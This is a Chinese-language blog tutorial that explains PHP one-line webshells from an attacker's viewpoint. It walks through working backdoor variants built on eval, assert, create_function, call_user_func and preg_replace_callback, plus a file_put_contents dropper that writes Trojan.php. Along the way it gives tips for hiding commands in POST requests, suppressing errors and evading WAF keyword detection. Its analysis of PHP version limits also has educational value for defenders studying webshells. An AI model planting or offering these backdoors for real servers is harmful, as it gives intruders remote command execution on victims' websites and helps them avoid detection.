# 前言

这篇文章虽然分析的是很多人看不上的 webshell，但是中间也夹杂着闪光点，闪光点主要在于 **assert 函数的具体限制**、**call_user_func 函数为什么不能调用 eval 的分析**、**call_user_func 版本限制分析**等。


# 什么是 webshell？
webshell 就是以网页文件形式存在的一种命令执行环境，也可以将其称做为一种网页后门。

顾名思义，`web`的含义是显然需要服务器开放 web 服务，`shell` 的含义是取得对服务器某种程度上操作权限。webshell 常常被称为入侵者通过网站端口对网站服务器的某种程度上操作的权限。由于 webshell 其大多是以动态脚本的形式出现，也有人称之为网站的后门工具。

一句话木马、小马、大马都可以叫 webshell。

> 一句话木马就是只需要一行代码的木马，短短一行代码，就能做到和大马相当的功能。为了绕过waf的检测，一句话木马出现了无数中变形，但本质是不变的：木马的函数**执行了我们发送的命令。**

 小马体积小，容易隐藏，隐蔽性强，最重要在于与图片结合一起上传之后可以利用nginx或者IIS6的解析漏洞来运行，不过功能少，一般只有上传等功能。在一些存在上传文件体积限制的情况下，比如当前功能做了上传文件限制，只允许上传10k以内的文件，小马一般只有6k，这样就可以绕过此上传点的限制，利用小马再上传大马（小马本身不限制上传文件的大小）。
 
 大马功能丰富，体积大。
 


# 一句话木马原理

以 PHP 为例。

一句话木马的原理是利用了 PHP 中的 eval()。

注： eval 是因为是一个语言构造器而不是一个函数，后面会具体解释。

> PHP eval() 把字符串按照 PHP 代码来计算。
该字符串必须是合法的 PHP 代码，且`必须以分号结尾`。
如果没有在代码字符串中调用 return 语句，则返回 NULL。如果代码中存在解析错误，则 eval() 函数返回 false。

如图，eval() 执行 system("DATE")。一个PHP文件中，eval执行完就会离开，所以不会执行到第二句eval函数。
![title](https://leanote.com/api/file/getImage?fileId=5da7cfd6ab64416c4c000135)


注意：必须加上 system()，system 函数执行外部程序，并且显示输出。就跟 python 里面的 os.system()  一个道理。

![title](https://leanote.com/api/file/getImage?fileId=5da7d2c5ab64416c4c000142)

然后通过 PHP 中的[超全局变量](https://www.w3school.com.cn/php/php_superglobals.asp)（如`$_GET`、`$_POST`、`$_REQUEST`、`$_COOKIE`）获取攻击者的指令输入。尝试构造一句话木马为：

![title](https://leanote.com/api/file/getImage?fileId=5da7d8d3ab64416c4c000174)

这个木马还有点问题：

1. 使用了超全局变量 `$_GET` 来通过 get 方法获取用户的输入命令。但是 GET 方法有一些限制，第一是存在长度限制：特定的浏览器及服务器会对通过  get 方法提交的字符串有一定的限制。第二是当网站管理员查 log 的时候，会看到明文的 get 请求参数，容易被发现，相比之下， post 请求敏感内容不容易被发现。所以最好把 get 方法换成 post 方法。
2. system 函数不应该被写进去。一方面是因为因为有时候 php 中的一些危险函数会被开发者或者网站管理人员禁用，我们可以先不写命令执行函数，攻击的时候可以自行选择更厉害的方法进行绕过。另一方面是写入了 system 这个一句话木马就只能执行命令了，但是不写的话通过使用不同的 payload 一个一句话木马其实啥都能做（就像一句话木马连上菜刀之后的功能），基本跟大马一样。
3. 在 eval 前面可以加一个 `@`，@是忽略可能出现的错误。

所以最终一句话木马写成这样：
``` php
<?php
@eval($_POST[c]);
?>
```
一句话木马文件：

![title](https://leanote.com/api/file/getImage?fileId=5da7df02ab64416c4c00045b)

执行效果：

![title](https://leanote.com/api/file/getImage?fileId=5da7ded4ab64416c4c000419)


![title](https://leanote.com/api/file/getImage?fileId=5da7e4c5ab64416e470008b0)




# 一句话木马变形

`注意：` 超全局变量方括号内必须打引号。

 - `$_POST[c]` 错误！ 
 - `$_POST['c']` 正确。


 ---------------
 
 
## assert 函数

 
assert 这个函数在 php 语言中是用来判断一个表达式是否成立。返回 true or false；assert 函数的参数会被执行，这跟 eval() 类似。

![title](https://leanote.com/api/file/getImage?fileId=5da7f031ab64416c4c000f30)

注意： `assert` 函数

``` php
<?php
@assert($_POST['c']);
?>
```

 ---------------
 
 
## assert 函数的具体限制

在 php 7.2 版本说明中，提到：

![title](https://leanote.com/api/file/getImage?fileId=5da826a4ab64416c4c002aa1)

也就是说：给 assert() 函数传入字符串参数，这个特性在 7.2 禁用，在 8.0 版本时会被彻底删除。

注意：我们对一句话木马使用的一些 payload，比如 phpinfo() 或者 system('command')，因为不是字符串，所以也就不受版本限制。
![title](https://leanote.com/api/file/getImage?fileId=5da82805ab64416e47002913)

![title](https://leanote.com/api/file/getImage?fileId=5da82871ab64416c4c002aa8)

但是这个限制会在 call_user_func 和 assert 一起使用时候显现。本文后面会具体解释。


 ---------------
 
 
## create_function 函数

在php中，函数create_function主要用来创建匿名函数。

语法：

``` php
string create_function(string $args, string $code)
string $args 变量部分
string $code 方法代码部分
```

注意当我们使用此匿名函数的时候，方法代码部分会被执行。

![title](https://leanote.com/api/file/getImage?fileId=5da7f7afab64416c4c001635)

![title](https://leanote.com/api/file/getImage?fileId=5da7f700ab64416c4c00157e)

构造的一句话木马为：
``` php
<?php
$tmp = create_function('',$_POST['c']);
$tmp();
?>
```

把用户传递的数据生成一个函数 tmp()，然后再执行 tmp()：


![title](https://leanote.com/api/file/getImage?fileId=5da80c00ab64416e47001f42)


 ---------------
 
 
## call_user_func 回调函数

`call_user_func` 这个函数可以调用其它函数，被调用的函数是 `call_user_func` 的第一个函数，被调用的函数的参数是 `call_user_func` 的第二个参数。这样的一个语句也可以完成一句话木马。一些被 waf 拦截的木马可以配合这个函数绕过 waf。

![title](https://leanote.com/api/file/getImage?fileId=5da80e19ab64416e470020a2)

![title](https://leanote.com/api/file/getImage?fileId=5da810b9ab64416e470022c0)

其实所有的一句话木马都由两部分组成：
1. 接收攻击者输入
2. 命令执行函数

所以我们构造的一句话木马为：

``` php
<?php
@call_user_func(assert,$_POST['a']);
?>
```

 ---------------
 
 
## call_user_func 版本限制

在我的测试环境（PHP Version 7.3.4），这个 webshell 是无法回显的：

![title](https://leanote.com/api/file/getImage?fileId=5da82bffab64416e4700293b)

但是这样就可以回显：

![title](https://leanote.com/api/file/getImage?fileId=5da82c31ab64416e4700293c)

原因是为什么呢？

还是前面说的：


![title](https://leanote.com/api/file/getImage?fileId=5da826a4ab64416c4c002aa1)

给 assert() 函数传入字符串参数，这个特性在 7.2 禁用。

因为通过超全局常量 `$_GET['']`获取的攻击者输入是字符串，这样传入assert函数就触发了禁用。

但是直接`assert(phpinfo())`传入的参数是函数，所以就不会触发函数禁用，可以正常回显。

**让我们换个php 版本来进行尝试：**

换到 PHP Version 7.1.9：

![title](https://leanote.com/api/file/getImage?fileId=5da82f8fab64416e4700294a)

也不可以。

换到 PHP Version 7.0.12：

![title](https://leanote.com/api/file/getImage?fileId=5da82fd8ab64416e4700294b)

就可以正常回显了。

也就是说这个禁用特性其实是从 php 7.1 版本开始的，并不是 7.2 版本才开始。所以 call_user_func + assert 构造的一句话木马在 php 7.0 版本及以下可以使用。

**演示一下加`@`和不加`@`的区别：**

在 call_user_func 前面可以加一个 `@`，@是忽略可能出现的错误。

输入一个 Windows 操作系统没有的命令 id，不加 @ 会显示出具体报错：

![title](https://leanote.com/api/file/getImage?fileId=5da8317aab64416c4c002aef)

加了 @ 就不会显示报错：

![title](https://leanote.com/api/file/getImage?fileId=5da831f7ab64416e47002966)

当然在没有错误的情况下加不加`@`看起来没有区别：

![title](https://leanote.com/api/file/getImage?fileId=5da83254ab64416c4c002af3)

注意：此时 post 数据后面加不加`;`无所谓，但是 post 参数时候，参数、等号、值之间不能有空格，否则就会出错（违背post数据的格式）。

![title](https://leanote.com/api/file/getImage?fileId=5da8332aab64416c4c002af9)


 ---------------
 
 
## call_user_func 函数为什么不能调用 eval 的分析

> `call_user_func` 这个函数可以调用其它函数，被调用的函数是 `call_user_func` 的第一个函数，被调用的函数的参数是 `call_user_func` 的第二个参数。这样的一个语句也可以完成一句话木马。一些被 waf 拦截的木马可以配合这个函数绕过 waf。

call_user_func 调用 assert 执行命令：

![title](https://leanote.com/api/file/getImage?fileId=5da84052ab64416c4c002b43)


使用 eval 尝试一下:

![title](https://leanote.com/api/file/getImage?fileId=5da8412cab64416e470029be)

却报错了。参考了这篇文章：[一句话木马踩坑记](https://xz.aliyun.com/t/6511)，分析原因为：eval 是因为是一个语言构造器而不是一个函数，不能被可变函数调用。`call_user_func` 有两个参数，第一个参数要求是函数，而`eval`只是一个语言构造器而不是函数，所以不符合 call_user_func 的语法，所以就报错了。


 ---------------
 
 
## preg_replace_callback() 函数
> 本文中不讨论 `preg_replace /e` 函数写 webshell，因为此函数5.5.0及以上版本已经被弃用了。使用 preg_replace_callback() 代替。



``` php
preg_replace_callback('/.+/i', create_function('$arr', 'return assert($arr[0]);'), $_REQUEST['pass']);
```

此 webshell 的原理为：通过 `create_function` “创造”一个函数，它接受一个数组，并将数组的第一个元素$arr[0]传入assert。

这是一个不杀不报稳定执行的回调后门，但因为有 `create_function` 这个敏感函数，所以看起来总是不太爽。不过也是没办法的事。

![title](https://leanote.com/api/file/getImage?fileId=5da99885ab64416c4c003331)

 ---------------
 
 
## file_put_contents 函数
> **夹带私货：**
webshell 调试三部曲：
1. 把函数写在 php 文件中，看能否执行
2. 写成 `$_GET['']` 方式传入命令，看能否执行
3. 写成 `$_POST['']`方式传入命令，能能否执行命令
`注：`2、3步可以合成通过`$_REQUEST['']`方法传入命令。

``` php
<?php
$test='<?php $a=$_POST["cmd"];assert($a); ?>';
file_put_contents("Trojan.php", $test);
?>
```

上面这个 webshell 利用函数生成 `Trojan.php` 木马文件。此木马文件的内容是
`file_put_contents` 函数：功能为：生成一个文件。第一个参数是文件名，第二个参数是文件的内容。

传上去此webshell：

![title](https://leanote.com/api/file/getImage?fileId=5da9a37dab64416e4700324f)

会生成一个 Trojan.php webshell。对其可以执行命令：

![title](https://leanote.com/api/file/getImage?fileId=5da9a3f4ab64416e47003251)

# bypass WAF

> WAF 通常以关键字判断是否为一句话木马，但是一句话木马的变形有很多种，WAF 根本不可能全部拦截。想要绕过 WAF，需要掌握各种 PHP 小技巧，掌握的技巧多了，把技巧结合起来，设计出属于自己的一句话木马。

一个 WAF 实例：
[PHP网站扫描一句话后门WebShell脚本源码](https://blog.csdn.net/qq_29647709/article/details/81474779)


此部分单独成文。

# 一句话木马 payload 分析

在这篇文章里面，主要示范了一句话木马的命令执行功能，其实一句话木马配合菜刀等工具完全可以等同于大马。只是使用的 payload 是上传功能、下载等函数。

如果要了解更多 payload，第一种方法是使用菜刀的时候抓包。抓包方法可以参考这篇文章：[新版中国菜刀（20141213）一句话不支持php assert分析](https://www.freebuf.com/articles/web/56616.html)。

另一种是分析 AntSword 的源码，因为 AntSword 是开源的。



--------------

参考链接：

[1] [新版中国菜刀（20141213）一句话不支持php assert分析](https://www.freebuf.com/articles/web/56616.html)，FREEBUF，JoyChou，2015年1月20日
[2] [PHP RFC：PHP 7.2的不推荐使用](https://wiki.php.net/rfc/deprecations_php_7_2)，PHP 官方文档，Nikita Popov，2015年12月28日
[3] [PHP一句话木马之小马](https://www.jianshu.com/p/90473b8e6667)，简书社区，Waldo_cuit，2018年5月13日
[4] [一句话木马踩坑记](https://xz.aliyun.com/t/6511)，先知社区，fz41，2019年10月15日
[5] [创造tips的秘籍——PHP回调后门](https://www.leavesongs.com/PENETRATION/php-callback-backdoor.html#)，PHITHON 的博客，PHITHON，2015年6月 
